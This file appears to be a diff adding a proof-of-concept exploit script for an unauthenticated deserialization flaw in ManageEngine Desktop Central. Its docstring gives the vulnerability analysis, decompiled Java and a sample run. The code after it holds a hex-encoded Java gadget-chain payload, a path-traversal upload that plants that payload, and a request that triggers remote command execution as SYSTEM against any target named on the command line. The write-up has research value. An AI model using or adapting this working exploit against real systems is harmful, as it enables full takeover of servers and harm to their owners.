@@ -1,0 +1,484 @@
+#!/usr/bin/python3
+"""
+ManageEngine Desktop Central FileStorage getChartImage Deserialization of Untrusted Data Remote Code Execution Vulnerability
+
+Download: https://www.manageengine.com/products/desktop-central/download-free.html
+File ...: ManageEngine_DesktopCentral_64bit.exe
+SHA1 ...: 73ab5bb00f993685c711c0aed450444795d5b826
+Found by: mr_me
+Date ...: 2019-12-12
+Class ..: CWE-502
+CVSS ...: AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H (9.8 Critical)
+
+## Summary:
+
+An unauthenticated attacker can reach a Deserialization of Untrusted Data vulnerability that can allow them to execute arbitrary code as SYSTEM/root.
+
+## Vulnerability Analysis:
+
+In the web.xml file, we can see one of the default available servlets is the `CewolfServlet` servlet.
+
+```
+<servlet>
+    <servlet-name>CewolfServlet</servlet-name>
+    <servlet-class>de.laures.cewolf.CewolfRenderer</servlet-class>
+
+    <init-param>
+        <param-name>debug</param-name>
+        <param-value>false</param-value>
+    </init-param>
+    <init-param>
+        <param-name>overliburl</param-name>
+        <param-value>/js/overlib.js</param-value>
+    </init-param>
+    <init-param>
+        <param-name>storage</param-name>
+        <param-value>de.laures.cewolf.storage.FileStorage</param-value>
+    </init-param>
+
+    <load-on-startup>1</load-on-startup>
+</servlet>
+
+    ...
+
+<servlet-mapping>
+    <servlet-name>CewolfServlet</servlet-name>
+    <url-pattern>/cewolf/*</url-pattern>
+</servlet-mapping>
+```
+
+This servlet, contains the following code:
+
+```
+    protected void doGet(HttpServletRequest request, HttpServletResponse response)
+            throws ServletException, IOException {
+        if (debugged) {
+            logRequest(request);
+        }
+        addHeaders(response);
+        if ((request.getParameter("state") != null) || (!request.getParameterNames().hasMoreElements())) {
+            requestState(response);
+            return;
+        }
+        int width = 400;
+        int height = 400;
+        boolean removeAfterRendering = false;
+        if (request.getParameter("removeAfterRendering") != null) {
+            removeAfterRendering = true;
+        }
+        if (request.getParameter("width") != null) {
+            width = Integer.parseInt(request.getParameter("width"));
+        }
+        if (request.getParameter("height") != null) {
+            height = Integer.parseInt(request.getParameter("height"));
+        }
+        if (!renderingEnabled) {
+            renderNotEnabled(response, 400, 50);
+            return;
+        }
+        if ((width > config.getMaxImageWidth()) || (height > config.getMaxImageHeight())) {
+            renderImageTooLarge(response, 400, 50);
+            return;
+        }
+        String imgKey = request.getParameter("img");                                // 1
+        if (imgKey == null) {
+            logAndRenderException(new ServletException("no 'img' parameter provided for Cewolf servlet."), response,
+                    width, height);
+            return;
+        }
+        Storage storage = config.getStorage();
+        ChartImage chartImage = storage.getChartImage(imgKey, request);             // 2
+```
+
+At [1] the code sets the `imgKey` variable using the GET parameter `img`. Later at [2], the code then calls the `storage.getChartImage` method with the attacker supplied `img`. You maybe wondering what class the `storage` instance is. This was mapped as an initializing parameter to the servlet code in the web.xml file:
+
+```
+    <init-param>
+        <param-name>storage</param-name>
+        <param-value>de.laures.cewolf.storage.FileStorage</param-value>
+    </init-param>
+```
+
+```
+public class FileStorage implements Storage {
+    static final long serialVersionUID = -6342203760851077577L;
+    String basePath = null;
+    List stored = new ArrayList();
+    private boolean deleteOnExit = false;
+
+    //...
+
+    public void init(ServletContext servletContext) throws CewolfException {
+        basePath = servletContext.getRealPath("/");
+        Configuration config = Configuration.getInstance(servletContext);
+        deleteOnExit = "true".equalsIgnoreCase("" + (String) config.getParameters().get("FileStorage.deleteOnExit"));
+        servletContext.log("FileStorage initialized, deleteOnExit=" + deleteOnExit);
+    }
+
+    //...
+
+    private String getFileName(String id) {
+        return basePath + "_chart" + id;                                            // 4
+    }
+
+    //...
+
+    public ChartImage getChartImage(String id, HttpServletRequest request) {
+        ChartImage res = null;
+        ObjectInputStream ois = null;
+        try {
+            ois = new ObjectInputStream(new FileInputStream(getFileName(id)));      // 3
+            res = (ChartImage) ois.readObject();                                    // 5
+            ois.close();
+        } catch (Exception ex) {
+            ex.printStackTrace();
+        } finally {
+            if (ois != null) {
+                try {
+                    ois.close();
+                } catch (IOException ioex) {
+                    ioex.printStackTrace();
+                }
+            }
+        }
+        return res;
+    }
+```
+
+At [3] the code calls `getFileName` using the attacker controlled `id` GET parameter which returns a path to a file on the filesystem using `basePath`. This field is set in the `init` method of the servlet. On the same line, the code creates a new `ObjectInputStream` instance from the supplied filepath via `FileInputStream`. This path is attacker controlled at [4], however, there is no need to (ab)use traversals here for exploitation.
+
+The most important point is that at [5] the code calls `readObject` using the contents of the file without any further lookahead validation.
+
+## Exploitation:
+
+For exploitation, an attacker can (ab)use the `MDMLogUploaderServlet` servlet to plant a file on the filsystem with controlled content inside. Here is the corresponding web.xml entry:
+
+```
+<servlet>
+    <servlet-name>MDMLogUploaderServlet</servlet-name>
+    <servlet-class>com.me.mdm.onpremise.webclient.log.MDMLogUploaderServlet</servlet-class>
+</servlet>
+
+...
+
+<servlet-mapping>
+    <servlet-name>MDMLogUploaderServlet</servlet-name>
+    <url-pattern>/mdm/mdmLogUploader</url-pattern>
+    <url-pattern>/mdm/client/v1/mdmLogUploader</url-pattern>
+</servlet-mapping>
+```
+
+```
+public class MDMLogUploaderServlet extends DeviceAuthenticatedRequestServlet {
+    private Logger logger = Logger.getLogger("MDMLogger");
+    private Long customerID;
+    private String deviceName;
+    private String domainName;
+    private Long resourceID;
+    private Integer platformType;
+    private Long acceptedLogSize = Long.valueOf(314572800L);
+
+    public void doPost(HttpServletRequest request, HttpServletResponse response, DeviceRequest deviceRequest)
+            throws ServletException, IOException {
+        Reader reader = null;
+        PrintWriter printWriter = null;
+
+        logger.log(Level.WARNING, "Received Log from agent");
+
+        Long nDataLength = Long.valueOf(request.getContentLength());
+
+        logger.log(Level.WARNING, "MDMLogUploaderServlet : file conentent lenght is {0}", nDataLength);
+
+        logger.log(Level.WARNING, "MDMLogUploaderServlet :Acceptable file conentent lenght is {0}", acceptedLogSize);
+        try {
+            if (nDataLength.longValue() <= acceptedLogSize.longValue()) {
+                String udid = request.getParameter("udid");                                                                     // 1
+                String platform = request.getParameter("platform");
+                String fileName = request.getParameter("filename");                                                             // 2
+                HashMap deviceMap = MDMUtil.getInstance().getDeviceDetailsFromUDID(udid);
+                if (deviceMap != null) {
+                    customerID = ((Long) deviceMap.get("CUSTOMER_ID"));
+                    deviceName = ((String) deviceMap.get("MANAGEDDEVICEEXTN.NAME"));
+                    domainName = ((String) deviceMap.get("DOMAIN_NETBIOS_NAME"));
+                    resourceID = ((Long) deviceMap.get("RESOURCE_ID"));
+                    platformType = ((Integer) deviceMap.get("PLATFORM_TYPE"));
+                } else {
+                    customerID = Long.valueOf(0L);
+                    deviceName = "default";
+                    domainName = "default";
+                }
+                String baseDir = System.getProperty("server.home");
+
+                deviceName = removeInvalidCharactersInFileName(deviceName);
+
+                String localDirToStore = baseDir + File.separator + "mdm-logs" + File.separator + customerID
+                        + File.separator + deviceName + "_" + udid;                                                             // 3
+
+                File file = new File(localDirToStore);
+                if (!file.exists()) {
+                    file.mkdirs();                                                                                              // 4
+                }
+                logger.log(Level.WARNING, "absolute Dir {0} ", new Object[]{localDirToStore});
+
+                fileName = fileName.toLowerCase();
+                if ((fileName != null) && (FileUploadUtil.hasVulnerabilityInFileName(fileName, "log|txt|zip|7z"))) {            // 5
+                    logger.log(Level.WARNING, "MDMLogUploaderServlet : Going to reject the file upload {0}", fileName);
+                    response.sendError(403, "Request Refused");
+                    return;
+                }
+                String absoluteFileName = localDirToStore + File.separator + fileName;                                          // 6
+
+                logger.log(Level.WARNING, "absolute File Name {0} ", new Object[]{fileName});
+
+                InputStream in = null;
+                FileOutputStream fout = null;
+                try {
+                    in = request.getInputStream();                                                                              // 7
+                    fout = new FileOutputStream(absoluteFileName);                                                              // 8
+
+                    byte[] bytes = new byte['✐'];
+                    int i;
+                    while ((i = in.read(bytes)) != -1) {
+                        fout.write(bytes, 0, i);                                                                                // 9
+                    }
+                    fout.flush();
+                } catch (Exception e1) {
+                    e1.printStackTrace();
+                } finally {
+                    if (fout != null) {
+                        fout.close();
+                    }
+                    if (in != null) {
+                        in.close();
+                    }
+                }
+                SupportFileCreation supportFileCreation = SupportFileCreation.getInstance();
+                supportFileCreation.incrementMDMLogUploadCount();
+                JSONObject deviceDetails = new JSONObject();
+                deviceDetails.put("platformType", platformType);
+                deviceDetails.put("dataId", resourceID);
+                deviceDetails.put("dataValue", deviceName);
+                supportFileCreation.removeDeviceFromList(deviceDetails);
+            } else {
+                logger.log(Level.WARNING,
+                        "MDMLogUploaderServlet : Going to reject the file upload as the file conentent lenght is {0}",
+                        nDataLength);
+                response.sendError(403, "Request Refused");
+                return;
+            }
+            return;
+        } catch (Exception e) {
+            logger.log(Level.WARNING, "Exception   ", e);
+        } finally {
+            if (reader != null) {
+                try {
+                    reader.close();
+                } catch (Exception ex) {
+                    ex.fillInStackTrace();
+                }
+            }
+        }
+    }
+```
+
+```
+    private static boolean isContainDirectoryTraversal(String fileName) {
+        if ((fileName.contains("/")) || (fileName.contains("\\"))) {
+            return true;
+        }
+        return false;
+    }
+
+    //...
+
+    public static boolean hasVulnerabilityInFileName(String fileName, String allowedFileExt) {
+        if ((isContainDirectoryTraversal(fileName)) || (isCompletePath(fileName))
+                || (!isValidFileExtension(fileName, allowedFileExt))) {
+            return true;
+        }
+        return false;
+    }
+```
+
+We can see that at [1] the `udid` variable is controlled using the `udid` GET parameter from a POST request. At [2] the `fileName` variable is controlled from the GET parameter `filename`. This `filename` GET parameter is actually filtered in 2 different ways for malicious values. At [3] a path is contructed using the GET parameter from [1] and at [4] a `mkdirs` primitive is hit. This is important because the _charts directory doesn't exist on the filesystem which is needed in order to exploit the deserialization bug. There is some validation on the `filename` at [5] which calls `FileUploadUtil.hasVulnerabilityInFileName` to check for directory traversals and an allow list of extensions.
+
+Of course, this doesn't stop `udid` from containing directory traversals, but I digress. At [6] the `absoluteFileName` variable is built up from the attacker influenced path at [3] using the filename from [2] and at [7] the binary input stream is read from the attacker controlled POST body. Finally at [8] and [9] the file is opened and the contents of the request is written to disk. What is not apparent however, is that further validation is performed on the `filename` at [2]. Let's take one more look at the web.xml file:
+
+```
+<init-param>
+    <param-name>config-file</param-name>
+    <param-value>security-regex.xml,security-mdm-regex.xml,security-mdm-api-regex.xml,security-properties.xml,security-common.xml,security-admin-sec-settings.xml,security-fws.xml,security-api.xml,security-patch-restapi.xml,security-mdm-groupdevices.xml,security-mdm-admin.xml,security-mdm-general.xml,security-mdm-agent.xml,security-mdm-reports.xml,security-mdm-inventory.xml,security-mdm-appmgmt.xml,security-mdm-docmgmt.xml,security-mdm-configuration.xml,security-defaultresponseheaders.xml,security-mdm-remote.xml,security-mdm-api-json.xml,security-mdm-api-get.xml,security-mdm-api-post.xml,security-mdm-api-put.xml,security-mdm-api-delete.xml,security-mdm-privacy.xml,security-mdm-osmgmt.xml,security-mdmapi-appmgmt.xml,security-mdmapi-profilejson.xml,security-mdmapi-profilemgmt.xml,security-mdm-compliance.xml,security-mdm-geofence.xml,security-mdmapi-sdp.xml,security-mdmp-CEA.xml,security-mdmapi-supporttab.xml,security-mdmapi-general.xml,security-mdm-roles.xml,security-mdm-technicians.xml,security-mdm-cea.xml,security-mdmapi-content-mgmt.xml,security-config.xml,security-patch.xml,security-patch-apd-scan.xml,security-patch-apd-scan-views.xml,security-patch-deployment.xml,security-patch-views.xml,security-patch-config.xml,security-patch-onpremise.xml,security-patch-server.xml,security-onpremise-common.xml,security-mdm-onpremise-files.xml,security-mdmapi-directory.xml,security-admin.xml,security-onpremise-admin.xml,security-reports.xml,security-inventory.xml,security-custom-fields.xml</param-value>
+</init-param>
+```
+
+The file that stands out is the `security-mdm-agent.xml` config file. The corrosponding entry for the `MDMLogUploaderServlet` servlet looks like this:
+
+```
+        <url path="/mdm/mdmLogUploader" apiscope="MDMCloudEnrollment"  authentication="required" duration="60" threshold="10" lock-period="60" method="post" csrf="false">
+            <param name="platform" regex="ios|android"/>
+            <param name="filename" regex="logger.txt|logger.zip|mdmlogs.zip|managedprofile_mdmlogs.zip"/>
+            <param name="uuid" regex="safestring"/>
+            <param name="udid" regex="udid"/>
+            <param name="erid" type="long"/>
+                        <param name="authtoken" regex="apikey" secret="true"/>
+                        <param name="SCOPE" regex="scope" />
+                        <param name="encapiKey" regex="encapiKey" max-len="200" />
+            <param name="initiatedBy" regex="safestring"/>
+            <param name="extraData" type="JSONObject" template="supportIssueDetailsJson" max-len="2500"/>
+        </url>
+```
+
+Note that the authentication attribute is ignored in this case. The `filename` GET parameter is restricted to the following strings: "logger.txt", "logger.zip", "mdmlogs.zip" and "managedprofile_mdmlogs.zip" using a regex pattern. For exploitation, this limitation doesn't matter since the deserialization bug permits a completely controlled filename.
+
+## Example:
+
+saturn:~ mr_me$ ./poc.py 
+(+) usage: ./poc.py <target> <cmd>
+(+) eg: ./poc.py 172.16.175.153 mspaint.exe
+
+saturn:~ mr_me$ ./poc.py 172.16.175.153 "cmd /c whoami > ../webapps/DesktopCentral/si.txt"
+(+) planted our serialized payload
+(+) executed: cmd /c whoami > ../webapps/DesktopCentral/si.txt
+
+saturn:~ mr_me$ curl http://172.16.175.153:8020/si.txt
+nt authority\system
+"""
+import os
+import sys
+import struct
+import requests
+from requests.packages.urllib3.exceptions import InsecureRequestWarning
+requests.packages.urllib3.disable_warnings(InsecureRequestWarning)
+
+def _get_payload(c):
+    p  = "aced0005737200176a6176612e7574696c2e5072696f72697479517565756594"
+    p += "da30b4fb3f82b103000249000473697a654c000a636f6d70617261746f727400"
+    p += "164c6a6176612f7574696c2f436f6d70617261746f723b787000000002737200"
+    p += "2b6f72672e6170616368652e636f6d6d6f6e732e6265616e7574696c732e4265"
+    p += "616e436f6d70617261746f72cf8e0182fe4ef17e0200024c000a636f6d706172"
+    p += "61746f7271007e00014c000870726f70657274797400124c6a6176612f6c616e"
+    p += "672f537472696e673b78707372003f6f72672e6170616368652e636f6d6d6f6e"
+    p += "732e636f6c6c656374696f6e732e636f6d70617261746f72732e436f6d706172"
+    p += "61626c65436f6d70617261746f72fbf49925b86eb13702000078707400106f75"
+    p += "7470757450726f706572746965737704000000037372003a636f6d2e73756e2e"
+    p += "6f72672e6170616368652e78616c616e2e696e7465726e616c2e78736c74632e"
+    p += "747261782e54656d706c61746573496d706c09574fc16eacab3303000649000d"
+    p += "5f696e64656e744e756d62657249000e5f7472616e736c6574496e6465785b00"
+    p += "0a5f62797465636f6465737400035b5b425b00065f636c6173737400125b4c6a"
+    p += "6176612f6c616e672f436c6173733b4c00055f6e616d6571007e00044c00115f"
+    p += "6f757470757450726f706572746965737400164c6a6176612f7574696c2f5072"
+    p += "6f706572746965733b787000000000ffffffff757200035b5b424bfd19156767"
+    p += "db37020000787000000002757200025b42acf317f8060854e002000078700000"
+    p += "069bcafebabe0000003200390a00030022070037070025070026010010736572"
+    p += "69616c56657273696f6e5549440100014a01000d436f6e7374616e7456616c75"
+    p += "6505ad2093f391ddef3e0100063c696e69743e010003282956010004436f6465"
+    p += "01000f4c696e654e756d6265725461626c650100124c6f63616c566172696162"
+    p += "6c655461626c6501000474686973010013537475625472616e736c6574506179"
+    p += "6c6f616401000c496e6e6572436c61737365730100354c79736f73657269616c"
+    p += "2f7061796c6f6164732f7574696c2f4761646765747324537475625472616e73"
+    p += "6c65745061796c6f61643b0100097472616e73666f726d010072284c636f6d2f"
+    p += "73756e2f6f72672f6170616368652f78616c616e2f696e7465726e616c2f7873"
+    p += "6c74632f444f4d3b5b4c636f6d2f73756e2f6f72672f6170616368652f786d6c"
+    p += "2f696e7465726e616c2f73657269616c697a65722f53657269616c697a617469"
+    p += "6f6e48616e646c65723b2956010008646f63756d656e7401002d4c636f6d2f73"
+    p += "756e2f6f72672f6170616368652f78616c616e2f696e7465726e616c2f78736c"
+    p += "74632f444f4d3b01000868616e646c6572730100425b4c636f6d2f73756e2f6f"
+    p += "72672f6170616368652f786d6c2f696e7465726e616c2f73657269616c697a65"
+    p += "722f53657269616c697a6174696f6e48616e646c65723b01000a457863657074"
+    p += "696f6e730700270100a6284c636f6d2f73756e2f6f72672f6170616368652f78"
+    p += "616c616e2f696e7465726e616c2f78736c74632f444f4d3b4c636f6d2f73756e"
+    p += "2f6f72672f6170616368652f786d6c2f696e7465726e616c2f64746d2f44544d"
+    p += "417869734974657261746f723b4c636f6d2f73756e2f6f72672f617061636865"
+    p += "2f786d6c2f696e7465726e616c2f73657269616c697a65722f53657269616c69"
+    p += "7a6174696f6e48616e646c65723b29560100086974657261746f720100354c63"
+    p += "6f6d2f73756e2f6f72672f6170616368652f786d6c2f696e7465726e616c2f64"
+    p += "746d2f44544d417869734974657261746f723b01000768616e646c6572010041"
+    p += "4c636f6d2f73756e2f6f72672f6170616368652f786d6c2f696e7465726e616c"
+    p += "2f73657269616c697a65722f53657269616c697a6174696f6e48616e646c6572"
+    p += "3b01000a536f7572636546696c6501000c476164676574732e6a6176610c000a"
+    p += "000b07002801003379736f73657269616c2f7061796c6f6164732f7574696c2f"
+    p += "4761646765747324537475625472616e736c65745061796c6f6164010040636f"
+    p += "6d2f73756e2f6f72672f6170616368652f78616c616e2f696e7465726e616c2f"
+    p += "78736c74632f72756e74696d652f41627374726163745472616e736c65740100"
+    p += "146a6176612f696f2f53657269616c697a61626c65010039636f6d2f73756e2f"
+    p += "6f72672f6170616368652f78616c616e2f696e7465726e616c2f78736c74632f"
+    p += "5472616e736c6574457863657074696f6e01001f79736f73657269616c2f7061"
+    p += "796c6f6164732f7574696c2f476164676574730100083c636c696e69743e0100"
+    p += "116a6176612f6c616e672f52756e74696d6507002a01000a67657452756e7469"
+    p += "6d6501001528294c6a6176612f6c616e672f52756e74696d653b0c002c002d0a"
+    p += "002b002e01000708003001000465786563010027284c6a6176612f6c616e672f"
+    p += "537472696e673b294c6a6176612f6c616e672f50726f636573733b0c00320033"
+    p += "0a002b003401000d537461636b4d61705461626c6501001d79736f7365726961"
+    p += "6c2f50776e6572373633323838353835323036303901001f4c79736f73657269"
+    p += "616c2f50776e657237363332383835383532303630393b002100020003000100"
+    p += "040001001a000500060001000700000002000800040001000a000b0001000c00"
+    p += "00002f00010001000000052ab70001b100000002000d0000000600010000002e"
+    p += "000e0000000c000100000005000f003800000001001300140002000c0000003f"
+    p += "0000000300000001b100000002000d00000006000100000033000e0000002000"
+    p += "0300000001000f00380000000000010015001600010000000100170018000200"
+    p += "19000000040001001a00010013001b0002000c000000490000000400000001b1"
+    p += "00000002000d00000006000100000037000e0000002a000400000001000f0038"
+    p += "00000000000100150016000100000001001c001d000200000001001e001f0003"
+    p += "0019000000040001001a00080029000b0001000c00000024000300020000000f"
+    p += "a70003014cb8002f1231b6003557b10000000100360000000300010300020020"
+    p += "00000002002100110000000a000100020023001000097571007e0010000001d4"
+    p += "cafebabe00000032001b0a000300150700170700180700190100107365726961"
+    p += "6c56657273696f6e5549440100014a01000d436f6e7374616e7456616c756505"
+    p += "71e669ee3c6d47180100063c696e69743e010003282956010004436f64650100"
+    p += "0f4c696e654e756d6265725461626c650100124c6f63616c5661726961626c65"
+    p += "5461626c6501000474686973010003466f6f01000c496e6e6572436c61737365"
+    p += "730100254c79736f73657269616c2f7061796c6f6164732f7574696c2f476164"
+    p += "6765747324466f6f3b01000a536f7572636546696c6501000c47616467657473"
+    p += "2e6a6176610c000a000b07001a01002379736f73657269616c2f7061796c6f61"
+    p += "64732f7574696c2f4761646765747324466f6f0100106a6176612f6c616e672f"
+    p += "4f626a6563740100146a6176612f696f2f53657269616c697a61626c6501001f"
+    p += "79736f73657269616c2f7061796c6f6164732f7574696c2f4761646765747300"
+    p += "2100020003000100040001001a00050006000100070000000200080001000100"
+    p += "0a000b0001000c0000002f00010001000000052ab70001b100000002000d0000"
+    p += "000600010000003b000e0000000c000100000005000f00120000000200130000"
+    p += "0002001400110000000a000100020016001000097074000450776e7270770100"
+    p += "7871007e000d78"
+    obj = bytearray(bytes.fromhex(p))
+    obj[0x240:0x242] = struct.pack(">H", len(c) + 0x694)
+    obj[0x6e5:0x6e7] = struct.pack(">H", len(c))
+    start = obj[:0x6e7]
+    end = obj[0x6e7:]
+    return start + str.encode(c) + end
+
+def we_can_plant_serialized(t, c):
+    # stage 1 - traversal file write primitive
+    uri = "https://%s:8383/mdm/client/v1/mdmLogUploader" % t
+    p = {
+        "udid" : "si\\..\\..\\..\\webapps\\DesktopCentral\\_chart",
+        "filename" : "logger.zip"
+    }
+    h = { "Content-Type" : "application/octet-stream" }
+    d = _get_payload(c)
+    r = requests.post(uri, params=p, data=d, verify=False)
+    if r.status_code == 200:
+        return True
+    return False
+
+def we_can_execute_cmd(t):
+    # stage 2 - deserialization
+    uri = "https://%s:8383/cewolf/" % t
+    p = { "img" : "\\logger.zip" }
+    r = requests.get(uri, params=p, verify=False)
+    if r.status_code == 200:
+        return True
+    return False
+
+def main():
+    if len(sys.argv) != 3:
+        print("(+) usage: %s <target> <cmd>" % sys.argv[0])
+        print("(+) eg: %s 172.16.175.153 mspaint.exe" % sys.argv[0])
+        sys.exit(1)
+    t = sys.argv[1]
+    c = sys.argv[2]
+    if we_can_plant_serialized(t, c):
+        print("(+) planted our serialized payload")
+        if we_can_execute_cmd(t):
+            print("(+) executed: %s" % c)
+
+if __name__ == "__main__":
+    main()
